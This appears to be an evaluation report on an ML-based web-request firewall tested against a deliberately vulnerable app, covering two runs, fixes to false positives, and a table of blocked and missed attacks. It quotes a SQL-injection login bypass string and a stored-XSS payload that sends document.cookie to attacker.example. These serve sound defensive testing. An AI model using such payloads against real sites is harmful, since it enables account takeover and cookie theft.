# Config 2 — logSguarDian Integration Results

This file has two runs. **Run 2 (below) is the current/valid result.** Run 1 is
kept as the historical record of what motivated the fixes applied before Run 2.

---

## Run 2 — rf_v4 / if_v3, body-encoding fix (current)

### Environment

- App: `logSguarDian-vulnerable-project`, branch `feat/logsguardian-integration`
- logSguarDian: `packages/core/src/middleware.ts` patched (see "Fix applied" below), rebuilt and repacked into `vendor/logsguardian-0.1.0.tgz` / `vendor/logsguardian-extractor-0.1.0.tgz`
- rf.onnx / if.onnx: `rf_v4` + `if_v3` (from `training/models/` in the logSguarDian repo, commit `744f8d5` "retrain rf_v4 + if_v3 on corrected feature space")
- RF_THRESHOLD: 0.35
- IF_THRESHOLD: 0.028394983206113 (updated from Run 1's 0.02901575)
- Mode: `block`
- Date: 2026-07-24

### What changed since Run 1

1. **Nav false-positive bug — fixed by the rf_v4/if_v3 retrain.** Run 1 found that any `GET` request with an empty query and empty body (i.e. ordinary page navigation — `/`, `/login`, `/posts`, `/admin`, `/users/:id`) fell back to using the URL path as the feature-extraction payload, and scored as `path_traversal`/`cmdi` at 0.40–0.83 confidence, blocking virtually all legitimate GET traffic. Confirmed fixed: `GET /login` and `GET /posts` now score **0.90 benign**, verdict `pass`.

2. **Body-encoding bug — found during this run, patched upstream.** With the nav-FP fixed, a second, previously-masked bug surfaced: every legitimate `POST /login` was blocked (predicted `xss`, 0.40 confidence). Root-caused to an asymmetry in `middleware.ts`: `canonical.query` is built via `new URLSearchParams(req.query).toString()`, but `canonical.body` was built via `JSON.stringify(req.body)`. The JSON wrapper's `{`, `}`, `:`, `,`, and extra `"` characters around every form field are structurally unlike anything in the training corpus's raw form-encoded body samples, and pushed every POST with a body toward the `xss` class regardless of content. Verified directly against the shipped `rf.onnx` (no retrain involved): the identical `{username: "alice", password: "alice123"}` body scores **xss @ 0.40** when JSON-encoded and **benign @ 0.90** when encoded as `username=alice&password=alice123` (the same style used for `query`).

   **Fix applied** (`packages/core/src/middleware.ts`, in this session): changed the body branch to use `new URLSearchParams(req.body).toString()`, matching the query branch. Rebuilt (`pnpm --filter logsguardian build`), repacked, and reinstalled into this repo's `vendor/`. This is an upstream logSguarDian source change, not a change to this vulnerable app's routes.

   After the fix, all three benign-traffic checks pass: `GET /login` → 200, `POST /login` (alice) → 302, `GET /posts` (authenticated) → 200.

### Results Summary

| Attack | Endpoint | Config 1 | Config 2 (rf_v4, Run 2) | Blocked |
|--------|----------|----------|--------------------------|---------|
| SQLi auth bypass | POST /login | Compromised | Blocked, `class: sqli`, confidence 0.50 | Y |
| SQLi UNION exfil | GET /posts/search | Compromised | Blocked, `class: sqli`, confidence 0.80 | Y |
| XSS bio (store) | POST /profile | Compromised | Blocked, `class: xss`, confidence 0.50 | Y |
| XSS bio (trigger) | GET /users/:id | Compromised | N/A — store was blocked, nothing to trigger | Y (moot) |
| XSS post (store) | POST /posts | Compromised | **Passed** — 302, post created with raw payload | N |
| XSS post (trigger) | GET /posts/:id | Compromised | **Passed** — 200, raw `<script>` tag in response | N |
| Path traversal /etc/passwd | GET attachment | Compromised | Blocked, `class: path_traversal`, confidence 0.53 | Y |
| Path traversal source | GET attachment | Compromised | Blocked, `class: path_traversal`, confidence 0.47 | Y |
| Command injection | POST /admin/ping | Compromised | Blocked, `class: sqli` (misclassified, still blocked), confidence 0.50 | Y |

**7/9 test cases blocked** (up from 6/8 in Run 1, and Run 1's blocks were unreliable due to the nav/login FP noise). The one attack that fully succeeded end-to-end — stored XSS via post content — did so cleanly in both store and trigger steps.

### Attack 3 methodology note (XSS bio store)

The task instructions specified `--form-string` for the bio-store request, same as the post-content attack. But `POST /profile` has no `multer` middleware (only the `/posts` routes do), so a multipart body isn't parsed by `express.urlencoded`/`express.json`, and `req.body.bio` arrives as `undefined` — the bio gets nulled, not XSS-injected. The initial `--form-string` run returned `200 OK`, but this was **not** a bypass: it wasn't a block because there was nothing there to block. Re-ran with `--data-urlencode` (matching the original `VULNERABILITIES.md` PoC and how a browser `<form>` without `enctype="multipart/form-data"` actually submits) and got a clean `403 {"class":"xss"}`. The table above reports this corrected result. Attack 5 (post content) genuinely does use `multer` on the server side, so `--form-string` there is correct as specified.

### Per-attack detail (Run 2)

1. **SQLi auth bypass** — `POST /login` with `' OR '1'='1' --`: `403`, `class: sqli`, confidence 0.50. Correctly identified and blocked (Run 1 missed this one, misclassified as `cmdi` at 0.30).
2. **SQLi UNION exfil** — legit alice login passed (302); UNION payload on `/posts/search`: `403`, `class: sqli`, confidence 0.80.
3. **XSS bio store** — `403`, `class: xss`, confidence 0.50 (using corrected `--data-urlencode` request; see methodology note above).
4. **XSS bio trigger** — N/A, nothing was stored.
5. **XSS post store** — `302 Found`, post #11 created successfully with the raw `<script>fetch(...)</script>` payload in `content`.
6. **XSS post trigger** — `200 OK`, response body contains the literal unescaped `<script>fetch("http://attacker.example/steal?c="+document.cookie)</script>` tag.
7. **Path traversal /etc/passwd** — `403`, `class: path_traversal`, confidence 0.53.
8. **Path traversal source code** — `403`, `class: path_traversal`, confidence 0.47.
9. **Command injection** — admin login passed (302); ping-injection payload: `403`, `class: sqli` (wrong class — should be `cmdi` — but still blocked, so the attack didn't reach `exec()`).

### What worked

- The nav-FP and login-FP fixes hold: every benign request in this run (`GET /login`, `POST /login` ×4, `GET /posts` ×3, `GET /users/2` ×3, `GET /posts/11` ×2) scored `benign`/`pass` with 0.43–1.00 confidence. Zero false positives observed on legitimate traffic in this run.
- SQLi (both the login-bypass and UNION variants), path traversal (both variants), and XSS-bio-store all correctly blocked with the right class label and reasonable confidence (0.50–0.80).
- Command injection was blocked, though under the wrong class label (`sqli` instead of `cmdi`) — the underlying cmdi/sqli separability weakness documented in the logSguarDian repo's `docs/limitations.md` §1 persists, but at `RF_THRESHOLD=0.35` it still clears the block bar.

### What did NOT work

- **Stored XSS via post content is a clean false negative — both store and trigger passed.** `POST /posts` with `<script>fetch(...)</script>` scored `benign` at confidence 0.50 (`if_score` 0.063, not even flagged as anomalous). This is the only attack that fully succeeded in this run. Given XSS-in-bio was correctly blocked at similar confidence levels, this is likely sensitive to the specific payload/field combination (a `fetch()` call inside `<script>` vs a `document.write()` call) rather than a structural gap — worth a follow-up with more XSS payload variants against `/posts` specifically before concluding the post-content path is systematically weaker than the bio path.

### False positives observed

None in this run, after the body-encoding fix. (Compare Run 1: effectively 100% FP on GET navigation, plus benign POST /login blocked.)

### Comparison vs Config 1 (no protection)

All 8 documented attacks fully compromised the app in Config 1. In Config 2 (Run 2), 7 of 9 test cases (XSS bio counted once since trigger is moot) are blocked, with legitimate traffic passing cleanly. The one gap — stored XSS via post content — is a real, reproducible false negative worth flagging as a limitation of this specific model/threshold combination, not a wiring or integration issue.

---

## Run 1 — rf_v3 / if_v2 (historical, superseded)

### Environment

- App: `logSguarDian-vulnerable-project` commit `a02a8e9ef382425b304375be832db0cb0fda2d65` (branch `feat/logsguardian-integration`)
- logSguarDian: commit `9a144abdce8e0b09da30c22e4fd69d7963175cab`, package `logsguardian@0.1.0`
- rf.onnx / if.onnx: `rf_v3` / `if_v2`
- RF_THRESHOLD: 0.35
- IF_THRESHOLD: 0.02901575
- Mode: `block`
- Date: 2026-07-24

### Integration notes (deviations from the plan)

- `logsguardian` and `@logsguardian/extractor` are workspace-only packages, not published to npm. Built and packed locally with `pnpm pack` into `vendor/logsguardian-0.1.0.tgz` and `vendor/logsguardian-extractor-0.1.0.tgz`, installed via `file:` dependency + an npm `overrides` entry (pnpm rewrites the internal `workspace:*` range to a plain `0.1.0` semver on pack, which plain `npm install` cannot resolve without the override).
- `onnxruntime-node` ships prebuilt binaries for glibc Linux, not musl. Switched the Dockerfile base image from `node:20-alpine` to `node:20` (Debian/glibc) — the original alpine image would not have loaded the ONNX runtime. Also reordered `COPY` before `npm install` so the vendored tarballs exist in the build context at install time.
- `rf.onnx` and `if.onnx` (~13MB total) copied into a new `models/` directory in this repo; `modelDir` in `src/app.js` points there.

### Results Summary (Run 1)

| Attack | Endpoint | Config 1 Result | Config 2 Result | Blocked? |
|--------|----------|-----------------|-----------------|----------|
| SQLi auth bypass | POST /login | Compromised | **Passed** — 302 redirect, admin session obtained | N |
| SQLi UNION exfil | GET /posts/search | Compromised | Blocked, 403, `class: sqli` | Y |
| XSS bio (store) | POST /profile | Compromised | Blocked, 403, `class: xss` | Y |
| XSS bio (trigger) | GET /users/:id | Compromised | Blocked, 403, `class: path_traversal` | Y |
| XSS post (store) | POST /posts | Compromised | Blocked, 403, `class: path_traversal` | Y |
| XSS post (trigger) | GET /posts/:id | Compromised | Blocked, 403, `class: path_traversal` | Y |
| Path traversal | GET /posts/:id/attachment | Compromised | Blocked, 403, `class: path_traversal` | Y |
| Command injection | POST /admin/ping | Compromised | **Passed** — 302 (app-level redirect, no admin session) | N |

### Critical finding (Run 1, resolved in Run 2)

Every benign GET (`/`, `/login`, `/posts`, `/admin`, `/users/:id`) and every benign `POST /login` was blocked, deterministically, across repeated requests — the app was unusable for legitimate traffic. Root-caused (in a separate diagnostic pass) to `deriveRawPayload()`'s `body > query > path` fallback: any GET with empty query/body used the URL path as the feature-extraction payload, and `ABSOLUTE_PATH_TEST = /^[\/\\]|.../ ` matches any string starting with `/` — true of every route. This matched a training-data gap already partially documented in the logSguarDian repo's `docs/limitations.md` §6 (blank `method`/`path` artifact): that fix normalized blank fields to a single placeholder (`method="GET", path="/"`) for query-bearing benign records, but never added a benign training example with a genuinely empty query *and* body, which is what ordinary page navigation looks like. The rf_v4/if_v3 retrain in Run 2 closes this gap.

The SQLi-bypass and command-injection false negatives in Run 1 were separately root-caused to real (pre-existing, still-partially-present) cmdi/sqli class-separability weakness, documented in `docs/limitations.md` §1 of the logSguarDian repo — not an artifact of the nav-FP bug.
